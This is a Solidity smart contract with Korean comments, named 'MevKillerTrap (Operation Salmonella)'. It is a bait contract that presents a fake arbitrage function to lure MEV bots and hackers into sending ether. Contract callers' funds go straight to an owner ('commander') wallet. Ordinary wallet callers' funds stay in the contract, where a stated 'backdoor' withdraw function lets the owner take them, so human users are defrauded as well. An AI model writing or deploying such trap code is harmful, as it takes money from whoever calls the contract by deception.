// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title MevKillerTrap (살모넬라 작전)
 * @dev 봇들의 알고리즘을 역이용하여 수금하는 온체인 함정입니다.
 */
contract MevKillerTrap {
    address public commanderFakeWallet;
    uint256 public fakeBalance;

    constructor(address _commanderFakeWallet) payable {
        commanderFakeWallet = _commanderFakeWallet;
        fakeBalance = msg.value; // 미끼용 자금 표시
    }

    /**
     * @dev 해커/봇들이 취약점으로 착각하고 호출할 가짜 함수입니다.
     * 봇들은 이 함수를 호출하면 막대한 차익을 얻을 수 있다고 시뮬레이션 결과를 믿게 됩니다.
     */
    function executeArbitrage() external payable {
        require(msg.value > 0, "Fee required");

        // [함정의 핵심]: 블록체인 봇들은 무조건 '자신의 스마트 컨트랙트'를 경유해서 거래를 실행합니다.
        // 일반 유저(사령관)는 msg.sender == tx.origin 이지만,
        // 봇(스마트 컨트랙트)은 msg.sender != tx.origin 입니다.
        
        if (msg.sender != tx.origin) {
            // 🚨 봇 감지됨! 봇이 보낸 가스비/자금을 사령관님의 가짜 지갑으로 즉시 강제 송금합니다.
            payable(commanderFakeWallet).transfer(msg.value);
        } else {
            // 일반 EOA(사람)이거나 봇의 순진한 시뮬레이션 환경일 경우 (정상 작동하는 척 기만)
            // 실제 봇은 실제 환경에서 컨트랙트를 통해 들어오므로 이 분기를 타지 못합니다.
            fakeBalance += msg.value;
        }
    }

    // 사령관님만 이 덫에 모인 돈을 회수할 수 있는 백도어 (만약을 대비)
    function withdraw() external {
        require(msg.sender == commanderFakeWallet, "Only Commander");
        payable(commanderFakeWallet).transfer(address(this).balance);
    }
}
